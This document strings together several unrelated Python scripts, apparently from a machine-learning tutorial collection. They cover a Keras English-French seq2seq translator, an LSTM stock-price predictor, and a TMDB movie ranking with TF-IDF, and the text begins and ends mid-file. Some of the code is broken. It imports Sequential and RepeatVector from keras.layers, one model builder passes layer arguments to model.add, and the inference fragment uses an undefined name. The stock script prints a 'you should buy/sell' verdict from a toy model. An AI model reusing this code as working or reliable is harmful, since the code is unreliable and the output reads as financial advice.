    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    return ' '.join([index_to_words[prediction] for prediction in logits])

# load the data
X, y, X_tk, y_tk, source_sequence_length, target_sequence_length = get_data("fra.txt")

X_tk = pickle.load(open("X_tk.pickle", "rb"))
y_tk = pickle.load(open("y_tk.pickle", "rb"))

model, enc, dec = create_model(source_sequence_length, target_sequence_length, LSTM_UNITS)

model.load_weights("results/eng_fra_v1_17568.086.h5")

while True:
    text = input("> ")
    tokenized = np.array(tokenize([text], tokenizer=X_tk)[0])
    print(tokenized.shape)
    X = pad_sequences(tokenized, maxlen=source_sequence_length, padding="post")
    X = X.reshape((1, 1, X.shape[-1]))
    print(X.shape)
    # X = to_categorical(X, num_classes=len(X_tk.word_index) + 1)
    print(X.shape)
    sequence = predict_sequence(enc, dec, X, target_sequence_length, source_sequence_length)

    result = logits_to_text(sequence, y_tk.index_word)
    print(result)




from tensorflow.keras.models import Model
from tensorflow.keras.layers import Input, LSTM, GRU, Dense, Embedding, Activation, Dropout, Sequential, RepeatVector
from tensorflow.keras.layers import TimeDistributed
from tensorflow.keras.preprocessing.text import Tokenizer
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.utils import to_categorical, plot_model
from tensorflow.keras.callbacks import ModelCheckpoint, TensorBoard
import numpy as np
import matplotlib.pyplot as plt
import os
import pickle

# hyper parameters
BATCH_SIZE = 32
EPOCHS = 10
LSTM_UNITS = 128

def create_encdec_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size):
    model = Sequential()
    model.add(LSTM(LSTM_UNITS), input_shape=input_shape[1:])
    model.add(RepeatVector(output_sequence_length))
    model.add(LSTM(LSTM_UNITS), return_sequences=True)
    model.add(TimeDistributed(Dense(french_vocab_size, activation="softmax")))
    model.compile(loss="sparse_categorical_crossentropy", optimizer="adam", metrics=["categorical_accuracy"])
    return model
    

def create_model(num_encoder_tokens, num_decoder_tokens, latent_dim):
    # define an input sequence
    encoder_inputs = Input(shape=(None, num_encoder_tokens))
    encoder = LSTM(latent_dim, return_state=True)
    # define the encoder output
    encoder_outputs, state_h, state_c = encoder(encoder_inputs)
    encoder_states = [state_h, state_c]
    # encoder inference model
    encoder_model = Model(encoder_inputs, encoder_states)

    # set up the decoder now
    decoder_inputs = Input(shape=(None, num_decoder_tokens))
    decoder_lstm = LSTM(latent_dim, return_sequences=True, return_state=True)
    decoder_outputs, _, _ = decoder_lstm(decoder_inputs, initial_state=encoder_states)
    decoder_dense = Dense(num_decoder_tokens, activation="softmax")
    decoder_outputs = decoder_dense(decoder_outputs)
    # decoder inference model
    decoder_state_input_h = Input(shape=(latent_dim,))
    decoder_state_input_c = Input(shape=(latent_dim,))
    decoder_state_inputs = [decoder_state_input_h, decoder_state_input_c]

    model = Model([encoder_inputs, decoder_inputs], decoder_outputs)

    decoder_outputs, state_h, state_c = decoder_lstm(decoder_inputs, initial_state=decoder_state_inputs)
    decoder_states = [state_h, state_c]
    decoder_model = Model([decoder_inputs] + decoder_state_inputs, [decoder_outputs] + decoder_states)

    return model, encoder_model, decoder_model


def get_batches(X, y, X_tk, y_tk, source_sequence_length, target_sequence_length, batch_size=BATCH_SIZE):
    # get total number of words in X
    num_encoder_tokens = len(X_tk.word_index) + 1
    # get max number of words in all sentences in y
    num_decoder_tokens = len(y_tk.word_index) + 1

    while True:
        for j in range(0, len(X), batch_size):
            encoder_input_data = X[j: j+batch_size]
            decoder_input_data = y[j: j+batch_size]
            # redefine batch size 
            # it may differ (in last batch of dataset)
            batch_size = encoder_input_data.shape[0]

            # one-hot everything
            # decoder_target_data = np.zeros((batch_size, num_decoder_tokens, target_sequence_length), dtype=np.uint8)
            # encoder_data = np.zeros((batch_size, source_sequence_length, num_encoder_tokens), dtype=np.uint8)
            # decoder_data = np.zeros((batch_size, target_sequence_length, num_decoder_tokens), dtype=np.uint8)
            encoder_data = np.expand_dims(encoder_input_data, axis=1)
            decoder_data = np.expand_dims(decoder_input_data, axis=1)

            # for i, sequence in enumerate(decoder_input_data):
            #     for t, word_index in enumerate(sequence):
            #         # skip the first
            #         if t > 0:
            #             decoder_target_data[i, t-1, word_index] = 1
                    # decoder_data[i, t, word_index] = 1
        
            # for i, sequence in enumerate(encoder_input_data):
            #     for t, word_index in enumerate(sequence):
            #         encoder_data[i, t, word_index] = 1
                    
            yield ([encoder_data, decoder_data], decoder_input_data)

    
def get_data(file):
    X = []
    y = []
    # loading the data
    for line in open(file, encoding="utf-8"):
        if "\t" not in line:
            continue

        # split by tab
        line = line.strip().split("\t")
        input = line[0]
        output = line[1]
        output = f"{output} <eos>"
        output_sentence_input = f"<sos> {output}"
        X.append(input)
        y.append(output)

    # tokenize data
    X_tk = Tokenizer()
    X_tk.fit_on_texts(X)
    X = X_tk.texts_to_sequences(X)

    y_tk = Tokenizer()
    y_tk.fit_on_texts(y)
    y = y_tk.texts_to_sequences(y)

    # define the max sequence length for X
    source_sequence_length = max(len(x) for x in X)
    # define the max sequence length for y
    target_sequence_length = max(len(y_) for y_ in y)
    # padding sequences
    X = pad_sequences(X, maxlen=source_sequence_length, padding="post")
    y = pad_sequences(y, maxlen=target_sequence_length, padding="post")

    return X, y, X_tk, y_tk, source_sequence_length, target_sequence_length


def shuffle_data(X, y):
    """
    Shuffles X & y and preserving their pair order
    """
    state = np.random.get_state()
    np.random.shuffle(X)
    np.random.set_state(state)
    np.random.shuffle(y)
    return X, y


def split_data(X, y, train_split_rate=0.2):
    # shuffle first
    X, y = shuffle_data(X, y)
    training_samples = round(len(X) * train_split_rate)
    return X[:training_samples], y[:training_samples], X[training_samples:], y[training_samples:]
    


if __name__ == "__main__":
    # load the data
    X, y, X_tk, y_tk, source_sequence_length, target_sequence_length = get_data("fra.txt")
    # save tokenizers
    pickle.dump(X_tk, open("X_tk.pickle", "wb"))
    pickle.dump(y_tk, open("y_tk.pickle", "wb"))
    # shuffle & split data
    X_train, y_train, X_test, y_test = split_data(X, y)
    # construct the models
    model, enc, dec = create_model(source_sequence_length, target_sequence_length, LSTM_UNITS)
    plot_model(model, to_file="model.png")
    plot_model(enc, to_file="enc.png")
    plot_model(dec, to_file="dec.png")
    model.summary()

    model.compile(optimizer="adam", loss="categorical_crossentropy", metrics=["accuracy"])

    if not os.path.isdir("results"):
        os.mkdir("results")

    checkpointer = ModelCheckpoint("results/eng_fra_v1_{val_loss:.3f}.h5", save_best_only=True, verbose=2)
    # train the model
    model.fit_generator(get_batches(X_train, y_train, X_tk, y_tk, source_sequence_length, target_sequence_length),
                        validation_data=get_batches(X_test, y_test, X_tk, y_tk, source_sequence_length, target_sequence_length),
                        epochs=EPOCHS, steps_per_epoch=(len(X_train) // BATCH_SIZE),
                        validation_steps=(len(X_test) // BATCH_SIZE),
                        callbacks=[checkpointer])
    
    print("[+] Model trained.")
    model.save("results/eng_fra_v1.h5")
    print("[+] Model saved.")




from tensorflow.keras.preprocessing.text import Tokenizer
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.models import Model, Sequential
from tensorflow.keras.layers import GRU, Input, Dense, TimeDistributed, Activation, RepeatVector, Bidirectional, Flatten
from tensorflow.keras.layers import Dropout, LSTM
from tensorflow.keras.optimizers import Adam
from tensorflow.keras.losses import sparse_categorical_crossentropy
import collections
import numpy as np

LSTM_UNITS = 128

def get_data(file):
    X = []
    y = []
    # loading the data
    for line in open(file, encoding="utf-8"):
        if "\t" not in line:
            continue
        # split by tab
        line = line.strip().split("\t")
        input = line[0]
        output = line[1]
        X.append(input)
        y.append(output)
    return X, y


def create_encdec_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size):
    model = Sequential()
    model.add(LSTM(LSTM_UNITS, input_shape=input_shape[1:]))
    model.add(RepeatVector(output_sequence_length))
    model.add(LSTM(LSTM_UNITS, return_sequences=True))
    model.add(TimeDistributed(Dense(french_vocab_size, activation="softmax")))
    model.compile(loss="sparse_categorical_crossentropy", optimizer="adam", metrics=["categorical_accuracy"])
    return model


def tokenize(x):
    """
    Tokenize x
    :param x: List of sentences/strings to be tokenized
    :return: Tuple of (tokenized x data, tokenizer used to tokenize x)
    """
    # TODO: Implement
    t = Tokenizer()
    t.fit_on_texts(x)
    return t.texts_to_sequences(x), t


def pad(x, length=None):
    """
    Pad x
    :param x: List of sequences.
    :param length: Length to pad the sequence to.  If None, use length of longest sequence in x.
    :return: Padded numpy array of sequences
    """
    # TODO: Implement
    sequences = pad_sequences(x, maxlen=length, padding='post')
    return sequences


def preprocess(x, y):
    """
    Preprocess x and y
    :param x: Feature List of sentences
    :param y: Label List of sentences
    :return: Tuple of (Preprocessed x, Preprocessed y, x tokenizer, y tokenizer)
    """
    preprocess_x, x_tk = tokenize(x)
    preprocess_y, y_tk = tokenize(y)

    preprocess_x = pad(preprocess_x)
    preprocess_y = pad(preprocess_y)

    # Keras's sparse_categorical_crossentropy function requires the labels to be in 3 dimensions
    preprocess_y = preprocess_y.reshape(*preprocess_y.shape, 1)

    return preprocess_x, preprocess_y, x_tk, y_tk


def logits_to_text(logits, tokenizer):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    index_to_words = {id: word for word, id in tokenizer.word_index.items()}
    index_to_words[0] = '<PAD>'

    return ' '.join([index_to_words[prediction] for prediction in np.argmax(logits, 1)])


if __name__ == "__main__":
    X, y = get_data("ara.txt")
    english_words = [word for sentence in X for word in sentence.split()]
    french_words = [word for sentence in y for word in sentence.split()]
    english_words_counter = collections.Counter(english_words)
    french_words_counter = collections.Counter(french_words)

    print('{} English words.'.format(len(english_words)))
    print('{} unique English words.'.format(len(english_words_counter)))
    print('10 Most common words in the English dataset:')
    print('"' + '" "'.join(list(zip(*english_words_counter.most_common(10)))[0]) + '"')
    print()
    print('{} French words.'.format(len(french_words)))
    print('{} unique French words.'.format(len(french_words_counter)))
    print('10 Most common words in the French dataset:')
    print('"' + '" "'.join(list(zip(*french_words_counter.most_common(10)))[0]) + '"')

    # Tokenize Example output
    text_sentences = [
        'The quick brown fox jumps over the lazy dog .',
        'By Jove , my quick study of lexicography won a prize .',
        'This is a short sentence .']
    text_tokenized, text_tokenizer = tokenize(text_sentences)
    print(text_tokenizer.word_index)
    print()
    for sample_i, (sent, token_sent) in enumerate(zip(text_sentences, text_tokenized)):
        print('Sequence {} in x'.format(sample_i + 1))
        print('  Input:  {}'.format(sent))
        print('  Output: {}'.format(token_sent))

    # Pad Tokenized output
    test_pad = pad(text_tokenized)
    for sample_i, (token_sent, pad_sent) in enumerate(zip(text_tokenized, test_pad)):
        print('Sequence {} in x'.format(sample_i + 1))
        print('  Input:  {}'.format(np.array(token_sent)))
        print('  Output: {}'.format(pad_sent))

    preproc_english_sentences, preproc_french_sentences, english_tokenizer, french_tokenizer =\
    preprocess(X, y)
    
    max_english_sequence_length = preproc_english_sentences.shape[1]
    max_french_sequence_length = preproc_french_sentences.shape[1]
    english_vocab_size = len(english_tokenizer.word_index)
    french_vocab_size = len(french_tokenizer.word_index)

    print('Data Preprocessed')
    print("Max English sentence length:", max_english_sequence_length)
    print("Max French sentence length:", max_french_sequence_length)
    print("English vocabulary size:", english_vocab_size)
    print("French vocabulary size:", french_vocab_size)

    tmp_x = pad(preproc_english_sentences, preproc_french_sentences.shape[1])
    tmp_x = tmp_x.reshape((-1, preproc_french_sentences.shape[-2], 1))
    print("tmp_x.shape:", tmp_x.shape)
    print("preproc_french_sentences.shape:", preproc_french_sentences.shape)

    # Train the neural network
    # increased passed index length by 1 to avoid index error
    encdec_rnn_model = create_encdec_model(
        tmp_x.shape,
        preproc_french_sentences.shape[1],
        len(english_tokenizer.word_index)+1,
        len(french_tokenizer.word_index)+1)
    print(encdec_rnn_model.summary())
    # reduced batch size
    encdec_rnn_model.fit(tmp_x, preproc_french_sentences, batch_size=256, epochs=3, validation_split=0.2)

    # Print prediction(s)
    print(logits_to_text(encdec_rnn_model.predict(tmp_x[1].reshape((1, tmp_x[1].shape[0], 1, )))[0], french_tokenizer))
    print("Original text and translation:")
    print(X[1])
    print(y[1])
    # OPTIONAL: Train and Print prediction(s)
    print("="*50)
    # Print prediction(s)
    print(logits_to_text(encdec_rnn_model.predict(tmp_x[10].reshape((1, tmp_x[1].shape[0], 1, ))[0]), french_tokenizer))
    print("Original text and translation:")
    print(X[10])
    print(y[10])
    # OPTIONAL: Train and Print prediction(s)




from tensorflow.keras.layers import LSTM, Dense, Dropout
from tensorflow.keras.callbacks import ModelCheckpoint, TensorBoard
from sklearn.metrics import mean_absolute_error, mean_squared_error, accuracy_score
import os
import time
import glob
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt

from utils import classify, shift, create_model, load_data

class PricePrediction:
    """A Class utility to train and predict price of stocks/cryptocurrencies/trades
        using keras model"""
    def __init__(self, ticker_name, **kwargs):
        """
        :param ticker_name (str): ticker name, e.g. aapl, nflx, etc.
        :param n_steps (int): sequence length used to predict, default is 60
        :param price_column (str): the name of column that contains price predicted, default is 'adjclose'
        :param feature_columns (list): a list of feature column names used to train the model, 
            default is ['adjclose', 'volume', 'open', 'high', 'low']
        :param target_column (str): target column name, default is 'future'
        :param lookup_step (int): the future lookup step to predict, default is 1 (e.g. next day)
        :param shuffle (bool): whether to shuffle the dataset, default is True
        :param verbose (int): verbosity level, default is 1
        ==========================================
        Model parameters
        :param n_layers (int): number of recurrent neural network layers, default is 3
        :param cell (keras.layers.RNN): RNN cell used to train keras model, default is LSTM
        :param units (int): number of units of cell, default is 256
        :param dropout (float): dropout rate ( from 0 to 1 ), default is 0.3
        ==========================================
        Training parameters
        :param batch_size (int): number of samples per gradient update, default is 64
        :param epochs (int): number of epochs, default is 100
        :param optimizer (str, keras.optimizers.Optimizer): optimizer used to train, default is 'adam'
        :param loss (str, function): loss function used to minimize during training,
            default is 'mae'
        :param test_size (float): test size ratio from 0 to 1, default is 0.15
        """
        self.ticker_name = ticker_name
        self.n_steps = kwargs.get("n_steps", 60)
        self.price_column = kwargs.get("price_column", 'adjclose')
        self.feature_columns = kwargs.get("feature_columns", ['adjclose', 'volume', 'open', 'high', 'low'])
        self.target_column = kwargs.get("target_column", "future")
        self.lookup_step = kwargs.get("lookup_step", 1)
        self.shuffle = kwargs.get("shuffle", True)
        self.verbose = kwargs.get("verbose", 1)

        self.n_layers = kwargs.get("n_layers", 3)
        self.cell = kwargs.get("cell", LSTM)
        self.units = kwargs.get("units", 256)
        self.dropout = kwargs.get("dropout", 0.3)

        self.batch_size = kwargs.get("batch_size", 64)
        self.epochs = kwargs.get("epochs", 100)
        self.optimizer = kwargs.get("optimizer", "adam")
        self.loss = kwargs.get("loss", "mae")
        self.test_size = kwargs.get("test_size", 0.15)

        # create unique model name
        self._update_model_name()

        # runtime attributes
        self.model_trained = False
        self.data_loaded = False
        self.model_created = False

        # test price values
        self.test_prices = None
        # predicted price values for the test set
        self.y_pred = None

        # prices converted to buy/sell classes
        self.classified_y_true = None
        # predicted prices converted to buy/sell classes
        self.classified_y_pred = None

        # most recent price
        self.last_price = None

        # make folders if does not exist
        if not os.path.isdir("results"):
            os.mkdir("results")

        if not os.path.isdir("logs"):
            os.mkdir("logs")

        if not os.path.isdir("data"):
            os.mkdir("data")

    def create_model(self):
        """Construct and compile the keras model"""
        self.model = create_model(input_length=self.n_steps,
                                    units=self.units,
                                    cell=self.cell,
                                    dropout=self.dropout,
                                    n_layers=self.n_layers,
                                    loss=self.loss,
                                    optimizer=self.optimizer)
        self.model_created = True
        if self.verbose > 0:
            print("[+] Model created")

    def train(self, override=False):
        """Train the keras model using self.checkpointer and self.tensorboard as keras callbacks.
        If model created already trained, this method will load the weights instead of training from scratch.
        Note that this method will create the model and load data if not called before."""
        
        # if model isn't created yet, create it
        if not self.model_created:
            self.create_model()

        # if data isn't loaded yet, load it
        if not self.data_loaded:
            self.load_data()

        # if the model already exists and trained, just load the weights and return
        # but if override is True, then just skip loading weights
        if not override:
            model_name = self._model_exists()
            if model_name:
                self.model.load_weights(model_name)
                self.model_trained = True
                if self.verbose > 0:
                    print("[*] Model weights loaded")
                return
        
        if not os.path.isdir("results"):
            os.mkdir("results")

        if not os.path.isdir("logs"):
            os.mkdir("logs")

        model_filename = self._get_model_filename()

        self.checkpointer = ModelCheckpoint(model_filename, save_best_only=True, verbose=1)
        self.tensorboard = TensorBoard(log_dir=f"logs\{self.model_name}")

        self.history = self.model.fit(self.X_train, self.y_train,
                        batch_size=self.batch_size,
                        epochs=self.epochs,
                        validation_data=(self.X_test, self.y_test),
                        callbacks=[self.checkpointer, self.tensorboard],
                        verbose=1)
        
        self.model_trained = True
        if self.verbose > 0:
            print("[+] Model trained")

    def predict(self, classify=False):
        """Predicts next price for the step self.lookup_step.
            when classify is True, returns 0 for sell and 1 for buy"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        # reshape to fit the model input
        last_sequence = self.last_sequence.reshape((self.last_sequence.shape[1], self.last_sequence.shape[0]))
        # expand dimension
        last_sequence = np.expand_dims(last_sequence, axis=0)
        predicted_price = self.column_scaler[self.price_column].inverse_transform(self.model.predict(last_sequence))[0][0]
        if classify:
            last_price = self.get_last_price()
            return 1 if last_price < predicted_price else 0
        else:
            return predicted_price

    def load_data(self):
        """Loads and preprocess data"""
        filename, exists = self._df_exists()
        if exists:
            # if the updated dataframe already exists in disk, load it
            self.ticker = pd.read_csv(filename)
            ticker = self.ticker
            if self.verbose > 0:
                print("[*] Dataframe loaded from disk")
        else:
            ticker = self.ticker_name

        result = load_data(ticker,n_steps=self.n_steps, lookup_step=self.lookup_step,
                            shuffle=self.shuffle, feature_columns=self.feature_columns,
                            price_column=self.price_column, test_size=self.test_size)
        
        # extract data
        self.df = result['df']
        self.X_train = result['X_train']
        self.X_test = result['X_test']
        self.y_train = result['y_train']
        self.y_test = result['y_test']
        self.column_scaler = result['column_scaler']
        self.last_sequence = result['last_sequence']      

        if self.shuffle:
            self.unshuffled_X_test = result['unshuffled_X_test']
            self.unshuffled_y_test = result['unshuffled_y_test']
        else:
            self.unshuffled_X_test = self.X_test
            self.unshuffled_y_test = self.y_test

        self.original_X_test = self.unshuffled_X_test.reshape((self.unshuffled_X_test.shape[0], self.unshuffled_X_test.shape[2], -1))
        
        self.data_loaded = True
        if self.verbose > 0:
            print("[+] Data loaded")

        # save the dataframe to disk
        self.save_data()

    def get_last_price(self):
        """Returns the last price ( i.e the most recent price )"""
        if not self.last_price:
            self.last_price = float(self.df[self.price_column].tail(1))
        return self.last_price

    def get_test_prices(self):
        """Returns test prices. Note that this function won't return the whole sequences,
        instead, it'll return only the last value of each sequence"""
        if self.test_prices is None:
            current = np.squeeze(self.column_scaler[self.price_column].inverse_transform([[ v[-1][0] for v in self.original_X_test ]]))
            future = np.squeeze(self.column_scaler[self.price_column].inverse_transform(np.expand_dims(self.unshuffled_y_test, axis=0)))
            self.test_prices = np.array(list(current) + [future[-1]])
        return self.test_prices

    def get_y_pred(self):
        """Get predicted values of the testing set of sequences ( y_pred )"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        if self.y_pred is None:
            self.y_pred = np.squeeze(self.column_scaler[self.price_column].inverse_transform(self.model.predict(self.unshuffled_X_test)))
        return self.y_pred

    def get_y_true(self):
        """Returns original y testing values ( y_true )"""
        test_prices = self.get_test_prices()
        return test_prices[1:]

    def _get_shifted_y_true(self):
        """Returns original y testing values shifted by -1.
        This function is useful for converting to a classification problem"""
        test_prices = self.get_test_prices()
        return test_prices[:-1]

    def _calc_classified_prices(self):
        """Convert regression predictions to a classification predictions ( buy or sell )
        and set results to self.classified_y_pred for predictions and self.classified_y_true 
        for true prices"""
        if self.classified_y_true is None or self.classified_y_pred is None:
            current_prices = self._get_shifted_y_true()
            future_prices = self.get_y_true()
            predicted_prices = self.get_y_pred()
            self.classified_y_true = list(map(classify, current_prices, future_prices))
            self.classified_y_pred = list(map(classify, current_prices, predicted_prices))
        
    # some metrics

    def get_MAE(self):
        """Calculates the Mean-Absolute-Error metric of the test set"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        y_true = self.get_y_true()
        y_pred = self.get_y_pred()
        return mean_absolute_error(y_true, y_pred)

    def get_MSE(self):
        """Calculates the Mean-Squared-Error metric of the test set"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        y_true = self.get_y_true()
        y_pred = self.get_y_pred()
        return mean_squared_error(y_true, y_pred)

    def get_accuracy(self):
        """Calculates the accuracy after adding classification approach (buy/sell)"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        self._calc_classified_prices()
        return accuracy_score(self.classified_y_true, self.classified_y_pred)

    def plot_test_set(self):
        """Plots test data"""
        future_prices = self.get_y_true()
        predicted_prices = self.get_y_pred()
        plt.plot(future_prices, c='b')
        plt.plot(predicted_prices, c='r')
        plt.xlabel("Days")
        plt.ylabel("Price")
        plt.legend(["Actual Price", "Predicted Price"])
        plt.show()

    def save_data(self):
        """Saves the updated dataframe if it does not exist"""
        filename, exists = self._df_exists()
        if not exists:
            self.df.to_csv(filename)
            if self.verbose > 0:
                print("[+] Dataframe saved")

    def _update_model_name(self):
        stock = self.ticker_name.replace(" ", "_")
        feature_columns_str = ''.join([ c[0] for c in self.feature_columns ])
        time_now = time.strftime("%Y-%m-%d")
        self.model_name = f"{time_now}_{stock}-{feature_columns_str}-loss-{self.loss}-{self.cell.__name__}-seq-{self.n_steps}-step-{self.lookup_step}-layers-{self.n_layers}-units-{self.units}"

    def _get_df_name(self):
        """Returns the updated dataframe name"""
        time_now = time.strftime("%Y-%m-%d")
        return f"data/{self.ticker_name}_{time_now}.csv"

    def _df_exists(self):
        """Check if the updated dataframe exists in disk, returns a tuple contains (filename, file_exists)"""
        filename = self._get_df_name()
        return filename, os.path.isfile(filename)

    def _get_model_filename(self):
        """Returns the relative path of this model name with h5 extension"""
        return f"results/{self.model_name}.h5"

    def _model_exists(self):
        """Checks if model already exists in disk, returns the filename,
        returns None otherwise"""
        filename = self._get_model_filename()
        return filename if os.path.isfile(filename) else None




# uncomment below to use CPU instead of GPU
# import os
# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=4,
#                         inter_op_parallelism_threads=4, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
#                        )

from tensorflow.keras.layers import GRU, LSTM
from price_prediction import PricePrediction

ticker = "AAPL"

p = PricePrediction(ticker, feature_columns=['adjclose', 'volume', 'open', 'high', 'low'],
                    epochs=700, cell=LSTM, optimizer="rmsprop", n_layers=3, units=256, 
                    loss="mse", shuffle=True, dropout=0.4)
p.train(True)
print(f"The next predicted price for {ticker} is {p.predict()}")
buy_sell = p.predict(classify=True)
print(f"you should {'sell' if buy_sell == 0 else 'buy'}.")

print("Mean Absolute Error:", p.get_MAE())
print("Mean Squared Error:", p.get_MSE())
print(f"Accuracy: {p.get_accuracy()*100:.3f}%")

p.plot_test_set()




from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import LSTM, Dense, Dropout
from sklearn import preprocessing
from yahoo_fin import stock_info as si
from collections import deque

import pandas as pd
import numpy as np
import random

def create_model(input_length, units=256, cell=LSTM, n_layers=2, dropout=0.3, loss="mean_absolute_error", optimizer="rmsprop"):
    model = Sequential()
    for i in range(n_layers):
        if i == 0:
            # first layer
            model.add(cell(units, return_sequences=True, input_shape=(None, input_length)))
            model.add(Dropout(dropout))
        elif i == n_layers -1:
            # last layer
            model.add(cell(units, return_sequences=False))
            model.add(Dropout(dropout))
        else:
            # middle layers
            model.add(cell(units, return_sequences=True))
            model.add(Dropout(dropout))
    
    model.add(Dense(1, activation="linear"))
    model.compile(loss=loss, metrics=["mean_absolute_error"], optimizer=optimizer)
        
    return model


def load_data(ticker, n_steps=60, scale=True, split=True, balance=False, shuffle=True,
                lookup_step=1, test_size=0.15, price_column='Price', feature_columns=['Price'],
                target_column="future", buy_sell=False):
    """Loads data from yahoo finance, if the ticker is a pd Dataframe,
    it'll use it instead"""
    if isinstance(ticker, str):
        df = si.get_data(ticker)
    elif isinstance(ticker, pd.DataFrame):
        df = ticker
    else:
        raise TypeError("ticker can be either a str, or a pd.DataFrame instance")

    result = {}

    result['df'] = df.copy()
    # make sure that columns passed is in the dataframe
    for col in feature_columns:
        assert col in df.columns
    
    column_scaler = {}
    if scale:
        # scale the data ( from 0 to 1 )
        for column in feature_columns:
            scaler = preprocessing.MinMaxScaler()
            df[column] = scaler.fit_transform(np.expand_dims(df[column].values, axis=1))
            column_scaler[column] = scaler
        # df[column] = preprocessing.scale(df[column].values)

    # add column scaler to the result
    result['column_scaler'] = column_scaler

    # add future price column ( shift by -1 )
    df[target_column] = df[price_column].shift(-lookup_step)

    # get last feature elements ( to add them to the last sequence )
    # before deleted by df.dropna
    last_feature_element = np.array(df[feature_columns].tail(1))

    # clean NaN entries
    df.dropna(inplace=True)

    if buy_sell:
        # convert target column to 0 (for sell -down- ) and to 1 ( for buy -up-)
        df[target_column] = list(map(classify, df[price_column], df[target_column]))

    seq_data = [] # all sequences here
    # sequences are made with deque, which keeps the maximum length by popping out older values as new ones come in
    sequences = deque(maxlen=n_steps)

    for entry, target in zip(df[feature_columns].values, df[target_column].values):
        sequences.append(entry)
        if len(sequences) == n_steps:
            seq_data.append([np.array(sequences), target])

    # get the last sequence for future predictions
    last_sequence = np.array(sequences)
    # shift the sequence, one element is missing ( deleted by dropna )
    last_sequence = shift(last_sequence, -1)
    # fill the last element
    last_sequence[-1] = last_feature_element

    # add last sequence to results
    result['last_sequence'] = last_sequence

    if buy_sell and balance:
        buys, sells = [], []
        for seq, target in seq_data:
            if target == 0:
                sells.append([seq, target])
            else:
                buys.append([seq, target])

        # balancing the dataset
        
        lower_length = min(len(buys), len(sells))

        buys = buys[:lower_length]
        sells = sells[:lower_length]

        seq_data = buys + sells

    if shuffle:
        unshuffled_seq_data = seq_data.copy()
        # shuffle data
        random.shuffle(seq_data)

    X, y = [], []
    for seq, target in seq_data:
        X.append(seq)
        y.append(target)

    X = np.array(X)
    y = np.array(y)

    if shuffle:
        unshuffled_X, unshuffled_y = [], []
        for seq, target in unshuffled_seq_data:
            unshuffled_X.append(seq)
            unshuffled_y.append(target)
        
        unshuffled_X = np.array(unshuffled_X)
        unshuffled_y = np.array(unshuffled_y)

        unshuffled_X = unshuffled_X.reshape((unshuffled_X.shape[0], unshuffled_X.shape[2], unshuffled_X.shape[1]))

    X = X.reshape((X.shape[0], X.shape[2], X.shape[1]))

    if not split:
        # return original_df, X, y, column_scaler, last_sequence
        result['X'] = X
        result['y'] = y
        return result
    else:
        # split dataset into training and testing
        n_samples = X.shape[0]
        train_samples = int(n_samples * (1 - test_size))
        result['X_train'] = X[:train_samples]
        result['X_test'] = X[train_samples:]
        result['y_train'] = y[:train_samples]
        result['y_test'] = y[train_samples:]
        if shuffle:
            result['unshuffled_X_test'] = unshuffled_X[train_samples:]
            result['unshuffled_y_test'] = unshuffled_y[train_samples:]
        return result

# from sentdex
def classify(current, future):
    if float(future) > float(current):  # if the future price is higher than the current, that's a buy, or a 1
        return 1
    else:  # otherwise... it's a 0!
        return 0


def shift(arr, num, fill_value=np.nan):
    result = np.empty_like(arr)
    if num > 0:
        result[:num] = fill_value
        result[num:] = arr[:-num]
    elif num < 0:
        result[num:] = fill_value
        result[:num] = arr[-num:]
    else:
        result = arr
    return result




import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from sklearn.feature_extraction.text import TfidfVectorizer

movies_path = r"E:\datasets\recommender_systems\tmdb_5000_movies.csv"
credits_path = r"E:\datasets\recommender_systems\tmdb_5000_credits.csv"

credits = pd.read_csv(credits_path)
movies  = pd.read_csv(movies_path)

# rename movie_id to id to merge dataframes later
credits = credits.rename(index=str, columns={'movie_id': 'id'})

# join on movie id column
movies = movies.merge(credits, on="id")

# drop useless columns
movies = movies.drop(columns=['homepage', 'title_x', 'title_y', 'status', 'production_countries'])

# number of votes of the movie
V = movies['vote_count']
# rating average of the movie from 0 to 10
R = movies['vote_average']
# the mean vote across the whole report
C = movies['vote_average'].mean()
# minimum votes required to be listed in the top 250
m = movies['vote_count'].quantile(0.7)

movies['weighted_average'] = (V/(V+m) * R) + (m/(m+V) * C)

# ranked movies

wavg = movies.sort_values('weighted_average', ascending=False)

plt.figure(figsize=(16,6))

ax = sns.barplot(x=wavg['weighted_average'].head(10), y=wavg['original_title'].head(10), data=wavg, palette='deep')

plt.xlim(6.75, 8.35)
plt.title('"Best" Movies by TMDB Votes', weight='bold')
plt.xlabel('Weighted Average Score', weight='bold')
plt.ylabel('Movie Title', weight='bold')

plt.savefig('best_movies.png')

popular = movies.sort_values('popularity', ascending=False)

plt.figure(figsize=(16,6))

ax = sns.barplot(x=popular['popularity'].head(10), y=popular['original_title'].head(10), data=popular, palette='deep')

plt.title('"Most Popular" Movies by TMDB Votes', weight='bold')
plt.xlabel('Popularity Score', weight='bold')
plt.ylabel('Movie Title', weight='bold')

plt.savefig('popular_movies.png')

############ Content-Based ############
# filling NaNs with empty string
movies['overview'] = movies['overview'].fillna('')

tfv = TfidfVectorizer(min_df=3,  max_features=None, 
            strip_accents='unicode', analyzer='word',token_pattern=r'\w{1,}',
            ngram_range=(1, 3), use_idf=1,smooth_idf=1,sublinear_tf=1,
            stop_words = 'english')

tfv_matrix = tfv.fit_transform(movies['overview'])
print(tfv_matrix.shape)
print(tfv_matrix)




import numpy as np
from PIL import Image
